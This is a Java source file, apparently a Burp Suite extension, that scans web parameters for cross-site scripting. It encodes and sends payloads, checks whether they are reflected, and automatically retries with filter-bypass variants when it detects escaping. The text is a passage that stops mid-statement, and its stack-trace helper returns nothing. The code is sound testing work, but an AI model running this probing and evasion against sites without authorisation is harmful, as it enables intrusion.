package burp;

import java.util.*;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import static burp.Constants.*;
import java.util.Arrays;
import java.nio.charset.StandardCharsets;

/**
 * Enhanced Aggressive XSS Scanner
 * Implements cutting-edge XSS detection techniques with advanced payload generation
 * Handles modern web application vulnerabilities and WAF bypass techniques
 * 
 * @version 2025.1.0 Advanced Edition
 */
public class EnhancedAggressive {
    
    private final IExtensionHelpers helpers;
    private final IBurpExtenderCallbacks callbacks;
    private final Settings settings;
    private final IHttpRequestResponse baseRequestResponse;
    private final List<Map> reflectedParameters;
    private final PayloadManager payloadManager;
    
    // Production-ready response tracking
    private String lastTestResponse = null;
    
    // Performance tracking
    private int totalTests = 0;
    private int vulnerabilitiesFound = 0;
    private long startTime;
    
    // CRITICAL: Store issues created during scanning to prevent duplicates
    private List<IScanIssue> createdIssues = new ArrayList<>();
    private Set<String> createdIssueKeys = new HashSet<>();
    
    // ADVANCED: Response caching system (shared instance)
    private static ResponseCache responseCache = null;
    
    // ADVANCED: Payload success tracking (shared instance)
    private static PayloadSuccessTracker payloadTracker = null;
    
    // ADVANCED: Parameter reflection tracking (shared instance)
    private static ParameterReflectionTracker reflectionTracker = null;
    
    /**
     * Production-ready exception handling utility
     */
    private String getStackTraceString(Exception e) {
        java.io.StringWriter sw = new java.io.StringWriter();
        java.io.PrintWriter pw = new java.io.PrintWriter(sw);
        callbacks.printError("Error: " + e.getMessage());
        return sw.toString();
    }
    
    /**
     * Production-ready error logging
     */
    private void logError(String context, Exception e) {
        if (callbacks != null) {
            callbacks.printError("[" + context + "] " + e.getClass().getSimpleName() + ": " + e.getMessage());
            // Stack trace only in verbose logging mode
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printOutput("Stack trace for " + context + ": " + getStackTraceString(e));
            }
        }
    }
    
    public EnhancedAggressive(Settings settings, IExtensionHelpers helpers, 
                             IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, 
                             List<Map> reflectedParameters) {
        this.settings = settings;
        this.helpers = helpers;
        this.baseRequestResponse = baseRequestResponse;
        this.callbacks = callbacks;
        this.reflectedParameters = reflectedParameters;
        this.payloadManager = new PayloadManager(settings, callbacks);
        this.startTime = System.currentTimeMillis();
        this.createdIssues = new ArrayList<>();
        this.createdIssueKeys = new HashSet<>();
        
        // Initialize advanced systems (shared instances)
        initializeAdvancedSystems(callbacks);
    }
    
    /**
     * Constructor for BurpExtender integration
     */
    public EnhancedAggressive(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, Settings settings) {
        this.settings = settings;
        this.helpers = helpers;
        this.callbacks = callbacks;
        this.baseRequestResponse = null;
        this.reflectedParameters = new ArrayList<>();
        this.payloadManager = new PayloadManager(settings, callbacks);
        this.startTime = System.currentTimeMillis();
        this.createdIssues = new ArrayList<>();
        this.createdIssueKeys = new HashSet<>();
        
        // Initialize advanced systems (shared instances)
        initializeAdvancedSystems(callbacks);
    }
    
    /**
     * Initialize advanced systems (shared across instances)
     */
    private static synchronized void initializeAdvancedSystems(IBurpExtenderCallbacks cb) {
        if (responseCache == null && cb != null) {
            responseCache = new ResponseCache(cb);
        }
        if (payloadTracker == null && cb != null) {
            payloadTracker = new PayloadSuccessTracker(cb);
        }
        if (reflectionTracker == null && cb != null) {
            reflectionTracker = new ParameterReflectionTracker(cb);
        }
    }
    
    /**
     * Clear all static caches - should be called when extension is unloaded
     */
    public static synchronized void clearStaticCaches() {
        if (responseCache != null) {
            responseCache.clearCache();
            responseCache = null;
        }
        if (payloadTracker != null) {
            payloadTracker.clear();
            payloadTracker = null;
        }
        if (reflectionTracker != null) {
            reflectionTracker.clear();
            reflectionTracker = null;
        }
    }

    /**
     * Get response cache instance
     */
    public static ResponseCache getResponseCache() {
        return responseCache;
    }

    /**
     * Get payload tracker instance
     */
    public static PayloadSuccessTracker getPayloadTracker() {
        return payloadTracker;
    }
    
    /**
     * Get reflection tracker instance
     */
    public static ParameterReflectionTracker getReflectionTracker() {
        return reflectionTracker;
    }
    
    /**
     * Generate unique key for issue to prevent duplicates
     */
    private String generateIssueKey(Map parameter, String payload) {
        try {
            String paramName = parameter != null ? String.valueOf(parameter.get(NAME)) : "unknown";
            String url = baseRequestResponse != null ? helpers.analyzeRequest(baseRequestResponse).getUrl().toString() : "unknown";
            // Use first 50 chars of payload for key (to handle long payloads)
            String payloadKey = payload != null ? payload.substring(0, Math.min(50, payload.length())) : "unknown";
            return url + "|" + paramName + "|" + payloadKey;
        } catch (Exception e) {
            return "unknown_" + System.currentTimeMillis();
        }
    }
    
    /**
     * Check if issue already created (duplicate prevention)
     */
    private boolean isDuplicateIssue(String issueKey) {
        return createdIssueKeys.contains(issueKey);
    }
    
    /**
     * Mark issue as created to prevent duplicates
     */
    private void markIssueAsCreated(String issueKey) {
        createdIssueKeys.add(issueKey);
    }
    
    /**
     * Perform active scan for XSS vulnerabilities with confirmed detection
     */
    public List<IScanIssue> doActiveScan(IHttpRequestResponse requestResponse, IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();
        
        try {
            // Get insertion point details
            String insertionPointName = insertionPoint.getInsertionPointName();
            IHttpService httpService = requestResponse.getHttpService();
            
            // Check response content type first
            String contentType = getResponseContentType(requestResponse);
            if (contentType == null || (!isVulnerableContentType(contentType))) {
                return issues; // Skip if not vulnerable content type
            }
            
            // Use context-aware payload selection (limited) for better coverage on modern apps
            List<String> testPayloads;
            try {
                Map<String, Object> param = new HashMap<>();
                param.put(Constants.NAME, insertionPointName);
                param.put(Constants.TYPE, insertionPoint.getInsertionPointType());
                param.put("CONTENT_TYPE", contentType);
                
                // CRITICAL: Perform architecture analysis and pass to payload generation
                try {
                    ModernArchitectureDetector archDetector = new ModernArchitectureDetector(helpers, callbacks, settings);
                    ModernArchitectureDetector.ArchitectureAnalysis archAnalysis = archDetector.analyzeArchitecture(requestResponse);
                    if (archAnalysis != null) {
                        param.put("ARCH_ANALYSIS", archAnalysis);
                    }
                } catch (Exception e) {
                    callbacks.printError("Error in architecture analysis: " + e.getMessage());
                }
                
                // CRITICAL: Detect application type from architecture analysis
                // Application type is already detected in architecture analysis above
                // Just extract it from archAnalysis if available
                try {
                    ModernArchitectureDetector.ArchitectureAnalysis archAnalysis = 
                        (ModernArchitectureDetector.ArchitectureAnalysis) param.get("ARCH_ANALYSIS");
                    if (archAnalysis != null) {
                        List<String> frameworks = archAnalysis.getDetectedFrameworks();
                        if (frameworks.contains("react")) {
                            param.put("APPLICATION_TYPE", "REACT");
                        } else if (frameworks.contains("angular")) {
                            param.put("APPLICATION_TYPE", "ANGULAR");
                        } else if (frameworks.contains("vue")) {
                            param.put("APPLICATION_TYPE", "VUE");
                        } else if (archAnalysis.hasGraphQL()) {
                            param.put("APPLICATION_TYPE", "GRAPHQL");
                        } else if (archAnalysis.isSPA()) {
                            param.put("APPLICATION_TYPE", "SPA");
                        } else if (archAnalysis.isMicroservices()) {
                            param.put("APPLICATION_TYPE", "MICROSERVICES");
                        } else if (archAnalysis.isJAMStack()) {
                            param.put("APPLICATION_TYPE", "JAMSTACK");
                        }
                    }
                } catch (Exception e) {
                    callbacks.printError("Error extracting application type: " + e.getMessage());
                }
                
                // CRITICAL: Perform real-time detection and add real-time payloads
                try {
                    // DOM XSS real-time analysis
                    if (settings.getModernDetection()) {
                        EnhancedDOMXSSDetector domDetector = new EnhancedDOMXSSDetector(helpers, callbacks, settings);
                        EnhancedDOMXSSDetector.DOMXSSResult domResult = domDetector.analyzeDOMXSS(requestResponse);
                        if (domResult != null && domResult.getRealTimeAnalysis() != null) {
                            EnhancedDOMXSSDetector.RealTimeDynamicAnalysis realTimeAnalysis = domResult.getRealTimeAnalysis();
                            if (realTimeAnalysis.hasRealTimeVectors()) {
                                param.put("REALTIME_VECTORS", realTimeAnalysis.getRealTimeVectors());
                                param.put("HAS_MUTATION_OBSERVER", realTimeAnalysis.isHasMutationObserver());
                                param.put("HAS_WEBSOCKET", realTimeAnalysis.isHasWebSocket());
                                param.put("HAS_EVENT_SOURCE", realTimeAnalysis.isHasEventSource());
                                param.put("HAS_SERVICE_WORKER", realTimeAnalysis.isHasServiceWorker());
                                param.put("HAS_DYNAMIC_IMPORT", realTimeAnalysis.isHasDynamicImport());
                                param.put("HAS_WEBASSEMBLY", realTimeAnalysis.isHasWebAssembly());
                            }
                        }
                    }
                    
                    // Client-side real-time analysis
                    if (settings.getModernDetection()) {
                        EnhancedClientSideAttackDetector clientDetector = new EnhancedClientSideAttackDetector(helpers, callbacks, settings);
                        EnhancedClientSideAttackDetector.ClientSideAttackResult clientResult = clientDetector.analyzeClientSideAttacks(requestResponse);
                        if (clientResult != null && clientResult.getRealTimeDynamicAnalysis() != null) {
                            EnhancedClientSideAttackDetector.RealTimeDynamicAnalysisResult realTimeResult = clientResult.getRealTimeDynamicAnalysis();
                            List<String> detectedVectors = realTimeResult.getDetectedVectors();
                            if (detectedVectors != null && !detectedVectors.isEmpty()) {
                                param.put("REALTIME_CLIENT_VECTORS", detectedVectors);
                                param.put("HAS_LIVE_DOM_MONITORING", realTimeResult.isHasLiveDOMMonitoring());
                                param.put("HAS_REALTIME_COMMUNICATION", realTimeResult.isHasRealTimeCommunication());
                                param.put("HAS_DYNAMIC_CODE_EXECUTION", realTimeResult.isHasDynamicCodeExecution());
                            }
                        }
                    }
                } catch (Exception e) {
                    callbacks.printError("Error in real-time detection: " + e.getMessage());
                }
                
                testPayloads = payloadManager != null
                    ? payloadManager.getContextAwarePayloads(param, requestResponse, helpers)
                    : Arrays.asList(Constants.CORE_XSS_PAYLOADS);
            } catch (Exception e) {
                testPayloads = Arrays.asList(Constants.CORE_XSS_PAYLOADS);
            }
            
            // CRITICAL: Increase payload cap when advanced features are enabled
            int maxPayloads = 18;
            try {
                if (settings != null) {
                    boolean aggressiveMode = Boolean.TRUE.equals(settings.getAggressiveMode());
                    String scannerMode = settings.getScannerMode();
                    boolean expertMode = scannerMode != null && scannerMode.contains("Expert");
                    boolean hasAdvancedFeatures = Boolean.TRUE.equals(settings.getEnablePolyglotPayloads()) ||
                                                 Boolean.TRUE.equals(settings.getEnableFrameworkSpecific()) ||
                                                 Boolean.TRUE.equals(settings.getEnablePrototypePollution()) ||
                                                 Boolean.TRUE.equals(settings.getEnablePostMessageXSS()) ||
                                                 Boolean.TRUE.equals(settings.getEnableWebComponents()) ||
                                                 Boolean.TRUE.equals(settings.getEnableModernBrowserAPI());
                    
                    if (aggressiveMode || expertMode) {
                        maxPayloads = 100; // Test all advanced payloads in aggressive/expert mode
                    } else if (hasAdvancedFeatures) {
                        maxPayloads = 50; // Test more payloads when advanced features enabled
                    }
                }
            } catch (Exception ignored) {}
            
            // CRITICAL: Get base response body to analyze context BEFORE encoding
            String baseResponseBody = null;
            String detectedContext = "UNKNOWN";
            String applicationType = null;
            try {
                byte[] baseResponse = requestResponse.getResponse();
                if (baseResponse != null && baseResponse.length > 0) {
                    int bodyOffset = helpers.analyzeResponse(baseResponse).getBodyOffset();
                    baseResponseBody = new String(
                        Arrays.copyOfRange(baseResponse, bodyOffset, baseResponse.length),
                        StandardCharsets.UTF_8
                    );
                    // Analyze context from base response structure
                    detectedContext = analyzeXSSContext(baseResponseBody, "");
                }
            } catch (Exception e) {
                // Ignore - will use defaults
            }
            
            // Get application type from param if available
            try {
                Map<String, Object> param = new HashMap<>();
                param.put(Constants.NAME, insertionPointName);
                param.put(Constants.TYPE, insertionPoint.getInsertionPointType());
                ModernArchitectureDetector archDetector = new ModernArchitectureDetector(helpers, callbacks, settings);
                ModernArchitectureDetector.ArchitectureAnalysis archAnalysis = archDetector.analyzeArchitecture(requestResponse);
                if (archAnalysis != null) {
                    List<String> frameworks = archAnalysis.getDetectedFrameworks();
                    if (frameworks.contains("react")) {
                        applicationType = "REACT";
                    } else if (frameworks.contains("angular")) {
                        applicationType = "ANGULAR";
                    } else if (frameworks.contains("vue")) {
                        applicationType = "VUE";
                    } else if (archAnalysis.hasGraphQL()) {
                        applicationType = "GRAPHQL";
                    } else if (archAnalysis.isSPA()) {
                        applicationType = "SPA";
                    }
                }
            } catch (Exception e) {
                // Ignore
            }
            
            int tested = 0;
            for (String payload : testPayloads) {
                try {
                    if (tested++ >= maxPayloads) break;
                    
                    // CRITICAL: Get parameter type for context-aware encoding
                    byte insertionPointType = insertionPoint.getInsertionPointType();
                    int paramType = insertionPointType;
                    boolean isURLParameter = (insertionPointType == IParameter.PARAM_URL);
                    
                    // CRITICAL: Use context-aware encoding instead of basic URL encoding
                    // This ensures payloads are properly encoded for their injection context
                    String encodedPayload = encodePayloadForContext(
                        payload, 
                        detectedContext, 
                        contentType, 
                        paramType, 
                        applicationType
                    );
                    
                    // Additional check: ensure URL parameters are URL-encoded (safety net)
                    if (isURLParameter && !encodedPayload.contains("%")) {
                        // If context-aware encoding didn't URL-encode, do it now
                        if (payload.startsWith("javascript:") || payload.startsWith("data:") || payload.startsWith("vbscript:")) {
                            int colonIndex = payload.indexOf(":");
                            if (colonIndex > 0) {
                                String protocol = payload.substring(0, colonIndex + 1);
                                String rest = payload.substring(colonIndex + 1);
                                encodedPayload = protocol + helpers.urlEncode(rest);
                            }
                        } else {
                            encodedPayload = helpers.urlEncode(payload);
                        }
                        callbacks.printOutput("[XSSDetector] Additional URL encoding applied for URL parameter");
                    }
                    
                    // Create test request with ENCODED payload
                    // CRITICAL: For URL parameters, buildRequest might not URL-encode automatically
                    // We need to verify and manually fix if needed
                    byte[] testRequest = insertionPoint.buildRequest(encodedPayload.getBytes());
                    
                    // CRITICAL FIX: ALWAYS verify and enforce URL encoding for URL parameters
                    // buildRequest might decode or not preserve URL encoding - we must ALWAYS check and fix
                    // This check is MANDATORY for URL parameters - never skip it
                    if (isURLParameter || insertionPoint.getInsertionPointType() == IParameter.PARAM_URL) {
                        // Ensure isURLParameter is set correctly
                        isURLParameter = true;
                        try {
                            // Ensure we have the URL-encoded version (in case it wasn't encoded earlier)
                            if (encodedPayload.equals(payload)) {
                                // Payload wasn't encoded - encode it now
                                encodedPayload = helpers.urlEncode(payload);
                            }
                            
                            String requestStr = new String(testRequest, StandardCharsets.UTF_8);
                            String encodedParamName = helpers.urlEncode(insertionPointName);
                            
                            // Check if raw (unencoded) payload appears in the request
                            // Pattern 1: ?param=payload or &param=payload (raw payload)
                            String pattern1 = "?" + insertionPointName + "=" + payload;
                            String pattern2 = "&" + insertionPointName + "=" + payload;
                            // Pattern 2: URL-encoded param name with raw payload
                            String pattern3 = "?" + encodedParamName + "=" + payload;
                            String pattern4 = "&" + encodedParamName + "=" + payload;
                            
                            boolean needsFix = requestStr.contains(pattern1) || requestStr.contains(pattern2) ||
                                             requestStr.contains(pattern3) || requestStr.contains(pattern4);
                            
                            // Additional check: verify encoded payload is present in query string
                            if (!needsFix) {
                                String encodedPattern1 = "?" + insertionPointName + "=" + encodedPayload;
                                String encodedPattern2 = "&" + insertionPointName + "=" + encodedPayload;
                                String encodedPattern3 = "?" + encodedParamName + "=" + encodedPayload;
                                String encodedPattern4 = "&" + encodedParamName + "=" + encodedPayload;
                                
                                boolean hasEncoded = requestStr.contains(encodedPattern1) || requestStr.contains(encodedPattern2) ||
                                                   requestStr.contains(encodedPattern3) || requestStr.contains(encodedPattern4);
                                
                                // If we don't have encoded version, check query string more carefully
                                if (!hasEncoded) {
                                    int queryStart = requestStr.indexOf("?");
                                    if (queryStart >= 0) {
                                        int queryEnd = requestStr.indexOf(" ", queryStart);
                                        if (queryEnd < 0) queryEnd = requestStr.indexOf("\r\n", queryStart);
                                        if (queryEnd < 0) queryEnd = requestStr.length();
                                        
                                        String queryString = requestStr.substring(queryStart, queryEnd);
                                        // Check if raw payload appears in query string
                                        if (queryString.contains(insertionPointName + "=" + payload) || 
                                            queryString.contains(encodedParamName + "=" + payload)) {
                                            needsFix = true;
                                        }
                                    }
                                }
                            }
                            
                            if (needsFix) {
                                // buildRequest didn't encode it or decoded it - manually fix
                                String replacement = insertionPointName + "=" + encodedPayload;
                                String replacementEncoded = encodedParamName + "=" + encodedPayload;
                                
                                // Replace all occurrences with proper encoding
                                requestStr = requestStr.replace(pattern1, "?" + replacement);
                                requestStr = requestStr.replace(pattern2, "&" + replacement);
                                requestStr = requestStr.replace(pattern3, "?" + replacementEncoded);
                                requestStr = requestStr.replace(pattern4, "&" + replacementEncoded);
                                
                                // Also handle cases where parameter appears in middle of query string
                                requestStr = requestStr.replace(insertionPointName + "=" + payload, replacement);
                                requestStr = requestStr.replace(encodedParamName + "=" + payload, replacementEncoded);
                                
                                testRequest = requestStr.getBytes(StandardCharsets.UTF_8);
                                callbacks.printOutput("[XSSDetector] MANUALLY FIXED: URL-encoded parameter '" + insertionPointName + "' in GET request");
                                
                                // Final verification - ensure raw payload is NOT present
                                String finalCheck = new String(testRequest, StandardCharsets.UTF_8);
                                if (finalCheck.contains(insertionPointName + "=" + payload) && !payload.equals(encodedPayload)) {
                                    callbacks.printError("WARNING: Raw payload still present after fix - attempting additional fix");
                                    finalCheck = finalCheck.replace(insertionPointName + "=" + payload, insertionPointName + "=" + encodedPayload);
                                    finalCheck = finalCheck.replace(encodedParamName + "=" + payload, encodedParamName + "=" + encodedPayload);
                                    testRequest = finalCheck.getBytes(StandardCharsets.UTF_8);
                                }
                                
                                // CRITICAL: Final absolute verification - if raw payload still exists in query string, REBUILD request
                                String absoluteFinalCheck = new String(testRequest, StandardCharsets.UTF_8);
                                int queryIdx = absoluteFinalCheck.indexOf("?");
                                if (queryIdx >= 0) {
                                    int queryEnd = absoluteFinalCheck.indexOf(" ", queryIdx);
                                    if (queryEnd < 0) queryEnd = absoluteFinalCheck.indexOf("\r\n", queryIdx);
                                    if (queryEnd < 0) queryEnd = absoluteFinalCheck.length();
                                    String queryStr = absoluteFinalCheck.substring(queryIdx, queryEnd);
                                    
                                    // If raw payload appears in query string, we MUST rebuild with proper encoding
                                    if (queryStr.contains(insertionPointName + "=" + payload) && !payload.equals(encodedPayload)) {
                                        callbacks.printError("CRITICAL: Raw payload in query string - REBUILDING request with proper encoding");
                                        // Extract URL path
                                        int pathStart = absoluteFinalCheck.indexOf(" ") + 1;
                                        int pathEnd = queryIdx;
                                        String path = absoluteFinalCheck.substring(pathStart, pathEnd);
                                        
                                        // Rebuild query string with proper encoding
                                        String[] params = queryStr.substring(1).split("&");
                                        StringBuilder newQuery = new StringBuilder("?");
                                        for (int i = 0; i < params.length; i++) {
                                            if (i > 0) newQuery.append("&");
                                            String param = params[i];
                                            if (param.startsWith(insertionPointName + "=")) {
                                                newQuery.append(insertionPointName).append("=").append(encodedPayload);
                                            } else if (param.startsWith(encodedParamName + "=")) {
                                                newQuery.append(encodedParamName).append("=").append(encodedPayload);
                                            } else {
                                                newQuery.append(param);
                                            }
                                        }
                                        
                                        // Rebuild full request
                                        String newRequest = absoluteFinalCheck.substring(0, pathStart) + path + newQuery.toString() + 
                                                          absoluteFinalCheck.substring(queryEnd);
                                        testRequest = newRequest.getBytes(StandardCharsets.UTF_8);
                                        callbacks.printOutput("[XSSDetector] REBUILT request with proper URL encoding");
                                    }
                                }
                            }
                        } catch (Exception e) {
                            callbacks.printError("Could not manually fix URL encoding: " + e.getMessage());
                            if (settings != null && settings.getVerboseLogging()) {
                                callbacks.printError("Exception details: " + e.getClass().getName());
                            }
                        }
                    }
                    
                    // Apply configurable rate limit between requests
                    int rateLimit = settings != null ? settings.getRequestRateLimit() : 0;
                    if (rateLimit > 0) {
                        try { Thread.sleep(rateLimit); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
                    }

                    // ACTUALLY SEND THE REQUEST AND GET REAL RESPONSE - via Burp (cookies/session/proxy aware)
                    int maxRetries = settings != null ? settings.getRetryAttempts() : 3;
                    IHttpRequestResponse rr = null;
                    byte[] responseBytes = null;
                    for (int attempt = 0; attempt <= maxRetries; attempt++) {
                        try {
                            rr = callbacks.makeHttpRequest(httpService, testRequest);
                            responseBytes = (rr != null) ? rr.getResponse() : null;
                            if (responseBytes != null && responseBytes.length > 0) {
                                // Check for server error worth retrying
                                int retryStatusCode = helpers.analyzeResponse(responseBytes).getStatusCode();
                                if (retryStatusCode >= 500 && attempt < maxRetries) {
                                    callbacks.printOutput("[XSSDetector] Server error (HTTP " + retryStatusCode + ") - retry " + (attempt + 1) + "/" + maxRetries);
                                    try { Thread.sleep(1000 * (attempt + 1)); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
                                    continue;
                                }
                                break; // Success or non-retryable status
                            }
                            if (attempt < maxRetries) {
                                callbacks.printOutput("[XSSDetector] Empty response - retry " + (attempt + 1) + "/" + maxRetries);
                                try { Thread.sleep(1000 * (attempt + 1)); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
                            }
                        } catch (Exception reqEx) {
                            if (attempt < maxRetries) {
                                callbacks.printOutput("[XSSDetector] Request failed - retry " + (attempt + 1) + "/" + maxRetries);
                                try { Thread.sleep(1000 * (attempt + 1)); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
                            }
                        }
                    }
                    if (responseBytes == null || responseBytes.length == 0) {
                        continue; // Skip if all retries failed
                    }
                    
                    // Use Burp's returned message where possible
                    IHttpRequestResponse testResponse = (rr != null) ? rr : new SimpleHttpRequestResponseWrapper(testRequest, responseBytes, httpService);
                    
                    // CRITICAL: Check response status code for WAF blocks, errors, and redirects
                    IResponseInfo responseInfo = helpers.analyzeResponse(responseBytes);
                    int statusCode = responseInfo.getStatusCode();
                    boolean isRedirect = statusCode >= 300 && statusCode < 400;

                    // Skip WAF-blocked and error responses - these are NOT real reflections
                    if (statusCode == 403 || statusCode == 406) {
                        callbacks.printOutput("[XSSDetector] WAF/filter block detected (HTTP " + statusCode + ") - skipping payload");
                        continue;
                    }
                    if (statusCode == 429) {
                        callbacks.printOutput("[XSSDetector] Rate limited (HTTP 429) - pausing");
                        try { Thread.sleep(2000); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
                        continue;
                    }
                    if (statusCode >= 500) {
                        callbacks.printOutput("[XSSDetector] Server error (HTTP " + statusCode + ") - skipping");
                        continue;
                    }
                    
                    // Get actual response body
                    int bodyOffset = responseInfo.getBodyOffset();
                    String responseBody = new String(Arrays.copyOfRange(responseBytes, bodyOffset, responseBytes.length), StandardCharsets.UTF_8);
                    
                    // CRITICAL: Check Location header for redirects
                    java.util.List<String> headers = responseInfo.getHeaders();
                    String locationHeader = null;
                    for (String header : headers) {
                        if (header.toLowerCase().startsWith("location:")) {
                            locationHeader = header.substring(header.indexOf(":") + 1).trim();
                            break;
                        }
                    }
                    
                    // CRITICAL: If redirect and payload is ONLY in Location header, it's NOT exploitable
                    // Modern browsers block javascript: protocol in Location headers for security
                    if (isRedirect && locationHeader != null && locationHeader.contains(payload)) {
                        // Check if payload is also in response body (not just Location header)
                        boolean payloadInBody = responseBody.contains(payload) || responseBody.contains(encodedPayload);
                        if (!payloadInBody) {
                            // Payload ONLY in Location header - NOT exploitable (browsers block it)
                            callbacks.printOutput("[XSSDetector] FALSE POSITIVE FILTERED: Payload in Location header only (redirect) - browsers block javascript: in Location headers");
                            continue; // Skip - not exploitable
                        }
                        // If payload is in body too, check if it's in a clickable link (requires user interaction)
                        if (payloadInBody && responseBody.contains("href=") && responseBody.contains(payload)) {
                            // Payload in href attribute in redirect page - requires user click, not automatic
                            // This is a lower severity issue, not "CONFIRMED" automatic exploitation
                            callbacks.printOutput("[XSSDetector] Payload in href attribute in redirect response - requires user click, not automatic exploitation");
                            // Continue validation but mark as lower severity
                        }
                    }
                    
                    // Check content type of actual response
                    String responseContentType = getResponseContentType(testResponse);
                    if (responseContentType == null || (!isVulnerableContentType(responseContentType))) {
                        continue; // Skip if response is not vulnerable content type
                    }
                    
                    // Confirm XSS vulnerability by checking payload reflection
                    // CRITICAL: Check for encoded payload, original payload, AND decoded versions
                    // If we injected URL-encoded payload, app might reflect it decoded
                    boolean isVulnerable = false;
                    
                    // Check 1: Direct encoded payload reflection
                    if (isXSSVulnerable(responseBody, encodedPayload, responseContentType)) {
                        isVulnerable = true;
                    }
                    // Check 2: Original payload reflection (if app doesn't URL-encode)
                    else if (isXSSVulnerable(responseBody, payload, responseContentType)) {
                        isVulnerable = true;
                    }
                    // Check 3: Decoded reflection (if we injected URL-encoded, app might decode it)
                    else if (!encodedPayload.equals(payload)) {
                        try {
                            String decodedPayload = helpers.urlDecode(encodedPayload);
                            if (decodedPayload != null && !decodedPayload.equals(encodedPayload)) {
                                if (isXSSVulnerable(responseBody, decodedPayload, responseContentType)) {
                                    isVulnerable = true;
                                    callbacks.printOutput("FOUND: Decoded URL payload reflection - injected: " + 
                                                         encodedPayload.substring(0, Math.min(30, encodedPayload.length())) + 
                                                         ", found decoded: " + decodedPayload.substring(0, Math.min(30, decodedPayload.length())));
                                }
                            }
                        } catch (Exception e) {
                            // Ignore decode errors
                        }
                    }
                    
                    // ADVANCED: Check for escaping even if not vulnerable - auto-inject bypasses
                    Map<String, Object> escapingInfo = null;
                    try {
                        escapingInfo = detectEscapingPatterns(responseBody, encodedPayload);
                    } catch (Exception e) {
                        if (settings != null && settings.getVerboseLogging()) {
                            callbacks.printError("Error detecting escaping patterns: " + e.getMessage());
                        }
                    }
                    
                    boolean escapingDetected = escapingInfo != null && (Boolean) escapingInfo.get("ESCAPING_DETECTED");
                    
                    if (escapingDetected && !isVulnerable && escapingInfo != null) {
                        // Escaping detected but payload not exploitable - try bypasses
                        String escapingType = (String) escapingInfo.get("ESCAPING_TYPE");
                        String bypassReflectionContext = (String) escapingInfo.get("REFLECTION_CONTEXT");
                        if (bypassReflectionContext == null) {
                            bypassReflectionContext = detectedContext;
                        }
                        callbacks.printOutput("[XSSDetector] ESCAPING DETECTED in doActiveScan - Auto-injecting bypass payloads: " + escapingType);
                        
                        // Generate and test bypass payloads with context awareness
                        List<String> bypassPayloads = generateBypassPayloads(payload, escapingType, bypassReflectionContext);
                        int bypassTested = 0;
                        int maxBypassTests = 15; // Limit for main scan flow
                        
                        for (String bypassPayload : bypassPayloads) {
                            if (bypassTested++ >= maxBypassTests) break;
                            
                            try {
                                // CRITICAL: Use context-aware encoding for bypass payloads
                                String encodedBypass = encodePayloadForContext(
                                    bypassPayload, 
                                    bypassReflectionContext, 
                                    contentType, 
                                    paramType, 
                                    applicationType
                                );
                                
                                // Additional check: ensure URL parameters are URL-encoded (safety net)
                                if (isURLParameter && !encodedBypass.contains("%")) {
                                    if (bypassPayload.startsWith("javascript:") || bypassPayload.startsWith("data:") || bypassPayload.startsWith("vbscript:")) {
                                        int colonIndex = bypassPayload.indexOf(":");
                                        if (colonIndex > 0) {
                                            String protocol = bypassPayload.substring(0, colonIndex + 1);
                                            String rest = bypassPayload.substring(colonIndex + 1);
                                            encodedBypass = protocol + helpers.urlEncode(rest);
                                        }
                                    } else {
                                        encodedBypass = helpers.urlEncode(bypassPayload);
                                    }
                                }
                                
                                // Create test request with bypass
                                byte[] bypassRequest = insertionPoint.buildRequest(encodedBypass.getBytes());
                                
                                // Fix URL encoding if needed (final verification)
                                if (isURLParameter) {
                                    String bypassRequestStr = new String(bypassRequest, StandardCharsets.UTF_8);
                                    if (bypassRequestStr.contains(insertionPointName + "=" + bypassPayload) && 
                                        !bypassPayload.equals(encodedBypass)) {
                                        bypassRequestStr = bypassRequestStr.replace(
                                            insertionPointName + "=" + bypassPayload,
                                            insertionPointName + "=" + encodedBypass
                                        );
                                        bypassRequest = bypassRequestStr.getBytes(StandardCharsets.UTF_8);
                                    }
                                }
                                
                                // Send bypass request
                                IHttpRequestResponse bypassRR = callbacks.makeHttpRequest(httpService, bypassRequest);
                                if (bypassRR == null || bypassRR.getResponse() == null) {
                                    continue;
                                }
                                
                                // Check bypass response
                                byte[] bypassResponseBytes = bypassRR.getResponse();
                                int bypassBodyOffset = helpers.analyzeResponse(bypassResponseBytes).getBodyOffset();
                                String bypassResponseBody = new String(
                                    Arrays.copyOfRange(bypassResponseBytes, bypassBodyOffset, bypassResponseBytes.length),
                                    StandardCharsets.UTF_8
                                );
                                
                                String bypassContentType = getResponseContentType(bypassRR);
                                if (isXSSVulnerable(bypassResponseBody, encodedBypass, bypassContentType)) {
                                    // BYPASS SUCCESSFUL!
                                    callbacks.printOutput("[XSSDetector] BYPASS SUCCESSFUL in doActiveScan! Payload: " + 
                                        bypassPayload.substring(0, Math.min(50, bypassPayload.length())));
                                    
                                    // Mark as vulnerable and continue with normal flow
                                    isVulnerable = true;
                                    encodedPayload = encodedBypass;
                                    payload = bypassPayload;
                                    responseBody = bypassResponseBody;
                                    responseContentType = bypassContentType;
                                    testResponse = bypassRR;
                                    break; // Found successful bypass, exit loop
                                }
                                
                            } catch (Exception e) {
                                // Continue with next bypass
                                if (settings != null && settings.getVerboseLogging()) {
                                    callbacks.printError("Error testing bypass in doActiveScan: " + e.getMessage());
                                }
                            }
                        }
                    }
                    
                    if (isVulnerable) {
                        // CRITICAL: First verify payload is actually reflected in response
                        // isXSSVulnerable() checks reflection, but we need explicit verification
                        // Check for: 1) encoded payload, 2) original payload, 3) decoded version if we injected encoded
                        boolean payloadReflectedExplicit = responseBody.contains(encodedPayload) || 
                                                          responseBody.contains(payload);
                        
                        // CRITICAL FIX: If we injected URL-encoded payload, check for decoded version in response
                        // Example: We inject %3Cscript%3E, server decodes it and reflects <script>
                        if (!payloadReflectedExplicit && encodedPayload != null && !encodedPayload.equals(payload)) {
                            try {
                                String decodedPayload = helpers.urlDecode(encodedPayload);
                                if (decodedPayload != null && !decodedPayload.equals(encodedPayload)) {
                                    if (responseBody.contains(decodedPayload)) {
                                        payloadReflectedExplicit = true;
                                        callbacks.printOutput("[XSSDetector] Decoded payload reflection detected: injected " + 
